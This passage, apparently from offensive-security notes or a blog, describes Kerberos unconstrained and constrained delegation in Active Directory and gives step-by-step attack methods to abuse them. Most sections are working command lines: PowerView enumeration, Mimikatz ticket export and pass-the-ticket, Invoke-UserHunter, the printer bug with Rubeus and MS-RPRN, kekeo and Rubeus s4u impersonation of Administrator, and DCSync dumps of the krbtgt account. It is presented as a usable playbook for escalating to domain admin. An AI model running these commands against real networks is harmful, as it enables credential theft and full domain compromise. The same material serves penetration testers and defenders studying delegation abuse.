</span></pre></table></code></div></div><h1 id="unconstrained-delegation"><span style="color:lightblue">Unconstrained Delegation</span></h1><ul><li>Kerberos Delegation allows to “reuse the end-user credentials to access resources hosted on a different server”.<li>This is typically useful in multi-tier service or applications where Kerberos Double Hop is required<li>For example, users authenticates to a web server and web server makes requests to a database server. The web server can request access to resources (all or some resources depending on the type of delegation) on the database server as the user and not as the web server’s service account.<li>Please note that, for the above example, the service account for web service must be trusted for delegation to be able to make requests as a user.</ul><h2 id="a-quick-explanation"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">A Quick Explanation</span></span><a href="#a-quick-explanation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p><img data-src="https://user-images.githubusercontent.com/59029171/163350877-ac24527c-23ed-4750-bcf0-35fccc7c65e3.png" alt="uc-del" data-proofer-ignore></p><ol><li>A user provides credentials to the Domain Controller.<li>The DC returns a TGT.<li>The user requests a TGS for the web service on Web Server.<li>The DC provides a TGS.<li>The user sends the TGT and TGS to the web server.<li>The web server service account use the user’s TGT to request a TGS for the database server from the DC.<li>The web server service account connects to the database server as the user.</ol><h2 id="types-of-delegations"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">Types of Delegations</span></span><a href="#types-of-delegations" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>There are two main types of delegation :</p><ul><li><strong>Unconstrained Delegation</strong> : the first hop server can request access to any service on any computer<li><strong>Constrained Delegation</strong> : the first hop server has a list of service it can request</ul><h2 id="unconstrained-delegation-1"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">Unconstrained Delegation</span></span><a href="#unconstrained-delegation-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="machine-in-unconstrained-delegation"><span class="mr-2"><span style="color:#F1C232"><span class="mr-2">Machine In Unconstrained Delegation</span></span><a href="#machine-in-unconstrained-delegation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><ul><li>The DC places user’s TGT inside TGS. When presented to the server with unconstrained delegation, the TGT is extracted from TGS and stored in <strong>LSASS</strong>. This way the server can reuse the user’s TGT to access any other resource as the user.<li>This could be used to escalate privileges in case we can compromise the computer with unconstrained delegation and a Domain Admin connects to that machine</ul><h2 id="methodologysteps-3"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">Methodology/Steps</span></span><a href="#methodologysteps-3" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><ul class="task-list"><li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />1. For an example we have machine pwn1 as an Unconstrained user; We are pwn0 and we got foot-hold/credentials/hashes for machine pwn2 who has local admin access for machine pwn1; Hence we can perform this attack<li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />2. Get a Powershell session as a different user using <strong>“Over pass the hash”</strong> attack if required(in this case its <strong>pwn2/appadmin</strong>)<li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />3. We can try searching for local admins it has access to using <strong>Find-LocalAdminAccess -Verbose</strong><li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />4. Create a <strong>New-PSSession</strong> attaching to the <strong>“Unconstrained user”</strong><li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />5. Enter the new session using <strong>Enter-PSSession</strong><li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />6. Bypass the <em>AMSI</em><li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />7. EXIT<li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />8. Load <strong>Mimikatz.ps1</strong> on the new session using <strong>Invoke-command</strong><li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />9. Enter the new session using <strong>Enter-PSSession</strong> <em>again</em><li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />10. Now we can get the admin token and save it to the disk<li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />11. Try and check if you have any file from a DA<li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />12. If not we can try to pull if there is any sessions logged on as <em>Administrator</em> as pwn0 using <strong>Invoke-Hunter</strong> then run the attack again<li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />13. Once we get an DA token we can Reuse the token using <strong>Invoke-Mimikatz</strong><li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />14. Now we can access any service on the DC; Example <strong><code class="language-plaintext highlighter-rouge">ls \\dc-corp\C$</code></strong> or use <strong>WMI-Commands</strong></ul><h2 id="powerview-1"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">PowerView</span></span><a href="#powerview-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="1-enumerate-computers-with-unconstrained-delegation"><span class="mr-2"><span style="color:#F1C232"><span class="mr-2">1. Enumerate computers with Unconstrained Delegation</span></span><a href="#1-enumerate-computers-with-unconstrained-delegation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="n">Get-NetComputer</span><span class="w"> </span><span class="nt">-UnConstrained</span><span class="w">
</span><span class="n">Get-NetComputer</span><span class="w"> </span><span class="nt">-Unconstrained</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">select</span><span class="w"> </span><span class="nt">-ExpandProperty</span><span class="w"> </span><span class="nx">name</span><span class="w">
</span></pre></table></code></div></div><blockquote class="prompt-info"><div><p>Ignore the domain controllers if they apeare in the list as they have Unconstrained Delegation enabled</p></div></blockquote><h3 id="2-check-if-a-token-is-available-and-save-to-disk"><span class="mr-2"><span style="color:#F1C232"><span class="mr-2">2. Check if a token is available and save to disk</span></span><a href="#2-check-if-a-token-is-available-and-save-to-disk" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><blockquote class="prompt-tip"><div><p><strong>Get the admin token.</strong> After compromising the computer with UD enabled, we can trick or wait for an admin connection</p></div></blockquote><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Invoke-Mimikatz</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s1">'"sekurlsa::tickets /export"'</span><span class="w">
</span></pre></table></code></div></div><h3 id="3-reuse-of-the-da-token"><span class="mr-2"><span style="color:#F1C232"><span class="mr-2">3. Reuse of the DA token</span></span><a href="#3-reuse-of-the-da-token" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Invoke-Mimikatz</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s1">'"kerberos::ptt Administrator@krbtgt-DOMAIN.LOCAL.kirbi"'</span><span class="w">
</span></pre></table></code></div></div><h2 id="invoke-hunter"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">Invoke-Hunter</span></span><a href="#invoke-hunter" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="pull-any-sessions-if-logged-on-with-administrator-if-no-administrator-sesson-found"><span class="mr-2"><span style="color:#F1C232"><span class="mr-2">Pull any sessions if logged on with administrator (if no administrator sesson found)</span></span><a href="#pull-any-sessions-if-logged-on-with-administrator-if-no-administrator-sesson-found" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Invoke-UserHunter</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="nx">dcorp-appsrv</span><span class="w"> </span><span class="nt">-Poll</span><span class="w"> </span><span class="nx">100</span><span class="w"> </span><span class="nt">-UserName</span><span class="w"> </span><span class="nx">Administrator</span><span class="w"> </span><span class="nt">-Delay</span><span class="w"> </span><span class="nx">5</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
</span></pre></table></code></div></div><h2 id="methodologysteps-printer-bug-method"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">Methodology/Steps (Printer Bug Method)</span></span><a href="#methodologysteps-printer-bug-method" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><ul class="task-list"><li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />1. Same as above perform an OPTH attack to get an elevated shell as DA<li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />2. Set <code class="language-plaintext highlighter-rouge">Rubeus.exe</code> on monitor more to capture hashes<li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />3. Run <code class="language-plaintext highlighter-rouge">MS-RPRN.exe</code> to abuse the printer bug<li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />4. Copy the b64encoded ticket of administrator of the DC<li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />5. Now we can run a DCSync attack against DC using the injected ticket</ul><h2 id="rubeusexe"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">Rubeus.exe</span></span><a href="#rubeusexe" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="1-set-on-monitor-mode-on-da"><span class="mr-2"><span style="color:#F1C232"><span class="mr-2">1. Set on monitor mode on DA</span></span><a href="#1-set-on-monitor-mode-on-da" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">.</span><span class="n">\Rubeus.exe</span><span class="w"> </span><span class="nx">monitor</span><span class="w"> </span><span class="nx">/interval:5</span><span class="w"> </span><span class="nx">/nowrap</span><span class="w">
</span></pre></table></code></div></div><h2 id="ms-rprnexe"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">MS-RPRN.exe</span></span><a href="#ms-rprnexe" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="2-abuse-the-printer-bug-from-the-uservm"><span class="mr-2"><span style="color:#F1C232"><span class="mr-2">2. Abuse the printer bug from the uservm</span></span><a href="#2-abuse-the-printer-bug-from-the-uservm" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">.</span><span class="n">\MS-RPRN.exe</span><span class="w"> </span><span class="nx">\\dc-user-here</span><span class="w"> </span><span class="nx">\\user-from-Poll-Server-Method</span><span class="w">
</span></pre></table></code></div></div><h2 id="rubeusexe-1"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">Rubeus.exe</span></span><a href="#rubeusexe-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="3-inject-the-b64-encoded-ticket"><span class="mr-2"><span style="color:#F1C232"><span class="mr-2">3. Inject the b64 encoded ticket</span></span><a href="#3-inject-the-b64-encoded-ticket" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">.</span><span class="n">\Rubeus.exe</span><span class="w"> </span><span class="nx">ptt</span><span class="w"> </span><span class="nx">/ticket:b64-text-goes-here</span><span class="w">
</span></pre></table></code></div></div><h2 id="invoke-mimikatz-2"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">Invoke-Mimikatz</span></span><a href="#invoke-mimikatz-2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="4-perform-a-dcsync-attack-against-dcorp-dc-using-the-injected-ticket"><span class="mr-2"><span style="color:#F1C232"><span class="mr-2">4. Perform a DCSync attack against DCORP-DC using the injected ticket</span></span><a href="#4-perform-a-dcsync-attack-against-dcorp-dc-using-the-injected-ticket" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="o">.</span><span class="w"> </span><span class="o">.</span><span class="n">\Invoke-Mimikatz.ps1</span><span class="w">
</span><span class="nx">Invoke-Mimikatz</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s1">'"lsadump::dcsync /user:dcorp\krbtgt"'</span><span class="w">
</span></pre></table></code></div></div><h1 id="constrained-delegation"><span style="color:lightblue">Constrained Delegation</span></h1><ul><li>Constrained Delegation when enabled on a service account, allows access only to specified services on specified computers as a user.<li>A typical scenario where constrained delegation is used - A user authenticates to a web service without using Kerberos and the web service makes requests to a database server to fetch results based on the user’s authorization.</ul><h2 id="extensions-required"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">Extensions Required</span></span><a href="#extensions-required" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><ul><li>To impersonate the user, Service for User (S4U) extension is used which provides two extensions:<ol><li><em>Service for User to Self (S4U2self)</em> : Allows a service to obtain a forwardable TGS to itself on behalf of a user.<li><em>Service for User to Proxy (S4U2proxy)</em> : Allows a service to obtain a TGS to a second service on behalf of a user.</ol></ul><h2 id="detailed-explaination"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">Detailed Explaination</span></span><a href="#detailed-explaination" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p><em>Service for User to Self (S4U2self)</em> : Allows a service to obtain a forwardable TGS to itself on behalf of a user with just the user principal name without supplying a password. The service account must have the &amp; TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION — T2A4D UserAccountControl attribute.</p><p><em>Service for User to Proxy (S4U2proxy)</em> : Allows a service to obtain a TGS toa second service on behalf of a user. Which second service? This is controlled by msDS-AllowedToDelegateTo attribute. This attribute contains a list of SPNs to which the user tokens can be forwarded. on</p><h2 id="a-quick-explanation-1"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">A Quick Explanation</span></span><a href="#a-quick-explanation-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p><img data-src="https://user-images.githubusercontent.com/59029171/163352158-2be581e1-57c4-4ba1-a809-49fc00e0d5d8.png" alt="c-del" data-proofer-ignore></p><ol><li>A user - X, authenticates to the web service (running with service account websvc) using a non-Kerberos compatible authentication mechanism.<li>The web service requests a ticket from the Key Distribution Center (KDC) for X’s account without supplying a password, as the websvc account.<li>The KDC checks the websvc userAccountControl value for the TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION attribute, and that X’s account is not blocked for delegation. If OK it returns a forwardable ticket for X’s account (S4U2Self).<li>The service then passes this ticket back to the KDC and requests a service ticket for the CIFS/domain-here.<li>The KDC checks the msDS-AllowedToDelegateTo field on the web service account. If the service is listed it will return a service ticket for requested service (S4U2Proxy).<li>The web service can now authenticate to the CIFS on requested service as X using the supplied TGS.</ol><h2 id="methodologysteps-4"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">Methodology/Steps</span></span><a href="#methodologysteps-4" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><ul class="task-list"><li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />1. List all the users having Constrained Delegation<li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />2. Keep a note of the <strong>msDS-AllowedToDelegateTo</strong> value<li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />3. Request for a TGT using the hash of the user with CD using kekeo (Which me must have collected before)<li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />4. Keep a note of the TGT return ticket<li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />5. Now request a TGS with the 2nd step and 4th step values as parameters in <em>/service</em> and <em>/tgt</em><li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />6. Keep a note of the TGS return Ticket<li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />7. Now we can inject the TGS return Ticket with <strong>Inkove-Mimikatz</strong><li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />8. We can now list the file systems of that account. Example : <strong><code class="language-plaintext highlighter-rouge">ls \\dc-account\C$</code></strong> but <em>can not</em> use any <strong>WMI-Commands</strong><li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />10. But if the user DC we can do the same process and then do a <strong>DCSync</strong> attack</ul><h2 id="powerview-dev-2"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">PowerView Dev</span></span><a href="#powerview-dev-2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="1-enumerate-users-and-computers-with-cd-enabled"><span class="mr-2"><span style="color:#F1C232"><span class="mr-2">1. Enumerate users and computers with CD enabled</span></span><a href="#1-enumerate-users-and-computers-with-cd-enabled" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="o">.</span><span class="w"> </span><span class="o">.</span><span class="n">\PowerView_dev.ps1</span><span class="w">
</span><span class="c"># for users</span><span class="w">
</span><span class="n">Get-DomainUser</span><span class="w"> </span><span class="nt">-TrustedToAuth</span><span class="w">
</span><span class="c"># for computers</span><span class="w">
</span><span class="n">Get-DomainComputer</span><span class="w"> </span><span class="nt">-TrustedToAuth</span><span class="w">
</span></pre></table></code></div></div><h2 id="keko"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">keko</span></span><a href="#keko" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="2-requesting-a-tgt-"><span class="mr-2"><span style="color:#F1C232"><span class="mr-2">2. Requesting a TGT </span></span><a href="#2-requesting-a-tgt-" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="go">.\kekeo.exe

tgt::ask /user:domain-here /domain:domain.local /rc4:rc4-hash-here
</span></pre></table></code></div></div><h3 id="3-request-a-tgs-"><span class="mr-2"><span style="color:#F1C232"><span class="mr-2">3. Request a TGS </span></span><a href="#3-request-a-tgs-" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="go">.\kekeo.exe

tgs::s4u /tgt:TGT.kirbi /user:Administrator@domain.local /service:cifs/computer.domain.LOCAL
</span></pre></table></code></div></div><h2 id="invoke-mimikatz-3"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">Invoke-Mimikatz</span></span><a href="#invoke-mimikatz-3" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="4-inject-the-ticket"><span class="mr-2"><span style="color:#F1C232"><span class="mr-2">4. Inject the ticket</span></span><a href="#4-inject-the-ticket" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Invoke-Mimikatz</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s1">'"kerberos::ptt TGS.kirbi"'</span><span class="w">
</span></pre></table></code></div></div><h3 id="5-execute-dcsync-extra"><span class="mr-2"><span style="color:#F1C232"><span class="mr-2">5. Execute DCSync (extra)</span></span><a href="#5-execute-dcsync-extra" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Invoke-Mimikatz</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s1">'"lsadump::dcsync /user:dcorp\krbtgt"'</span><span class="w">
</span></pre></table></code></div></div><h3 id="6-we-can-access-the-file-system"><span class="mr-2"><span style="color:#F1C232"><span class="mr-2">6. We can access the file system</span></span><a href="#6-we-can-access-the-file-system" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">ls</span><span class="w"> </span><span class="nx">\\dc-name-here\C</span><span class="err">$</span><span class="w">
</span></pre></table></code></div></div><h2 id="using-rubeusexe---users"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">Using Rubeus.exe - Users</span></span><a href="#using-rubeusexe---users" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="1-we-request-a-tgt-for-userx-using-its-ntlm-hash-to-get-a-tgs-for-userx-as-the-domain-administrator---administrator-then-the-tgs-used-to-access-the-service-specified-in-the-msdsspn-parameter-which-is-the-filesystem-on-dc-child"><span class="mr-2"><span style="color:#F1C232"><span class="mr-2">1. We request a TGT for userX using its NTLM hash to get a TGS for userX as the Domain Administrator - Administrator. Then the TGS used to access the service specified in the /msdsspn parameter (which is the filesystem on dc-child)</span></span><a href="#1-we-request-a-tgt-for-userx-using-its-ntlm-hash-to-get-a-tgs-for-userx-as-the-domain-administrator---administrator-then-the-tgs-used-to-access-the-service-specified-in-the-msdsspn-parameter-which-is-the-filesystem-on-dc-child" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">.</span><span class="n">\Rubeus.exe</span><span class="w"> </span><span class="nx">s4u</span><span class="w"> </span><span class="nx">/user:userX</span><span class="w"> </span><span class="nx">/rc4:rc4-hash-here</span><span class="w"> </span><span class="nx">/impersonateuser:Administrator</span><span class="w"> </span><span class="nx">/msdsspn:</span><span class="s2">"CIFS/dc-child.child-domain.root-domain.LOCAL"</span><span class="w"> </span><span class="nx">/ptt</span><span class="w">
</span></pre></table></code></div></div><h3 id="2-check-if-tgs-is-injected"><span class="mr-2"><span style="color:#F1C232"><span class="mr-2">2. Check if TGS is injected</span></span><a href="#2-check-if-tgs-is-injected" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="go">klist
</span></pre></table></code></div></div><h3 id="3-we-can-access-the-file-system"><span class="mr-2"><span style="color:#F1C232"><span class="mr-2">3. We can access the file system</span></span><a href="#3-we-can-access-the-file-system" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">ls</span><span class="w"> </span><span class="nx">\\dc-name-here\C</span><span class="err">$</span><span class="w">
</span></pre></table></code></div></div><h2 id="using-rubeusexe---computers"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">Using Rubeus.exe - Computers</span></span><a href="#using-rubeusexe---computers" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="1-abuse-delegation-of-computerx-using-rubeus-note-use-the-altservice-parameter-to-include-ldap-for-dcsync-attack"><span class="mr-2"><span style="color:#F1C232"><span class="mr-2">1. abuse delegation of computerX$ using Rubeus (Note: use the /altservice parameter to include LDAP for DCSync attack)</span></span><a href="#1-abuse-delegation-of-computerx-using-rubeus-note-use-the-altservice-parameter-to-include-ldap-for-dcsync-attack" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">.</span><span class="n">\Rubeus.exe</span><span class="w"> </span><span class="nx">s4u</span><span class="w"> </span><span class="nx">/user:comuterX</span><span class="err">$</span><span class="w"> </span><span class="nx">/rc4:rc4-hash-here</span><span class="w"> </span><span class="nx">/impersonateuser:Administrator</span><span class="w"> </span><span class="nx">/msdsspn:</span><span class="s2">"service-name-here"</span><span class="w"> </span><span class="nx">/altservice:ldap</span><span class="w"> </span><span class="nx">/ptt</span><span class="w">
</span></pre></table></code></div></div><h3 id="2-run-the-dcsync-attack"><span class="mr-2"><span style="color:#F1C232"><span class="mr-2">2. Run the DCSync attack</span></span><a href="#2-run-the-dcsync-attack" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="o">.</span><span class="w"> </span><span class="o">.</span><span class="n">\Invoke-Mimikatz.ps1</span><span class="w">
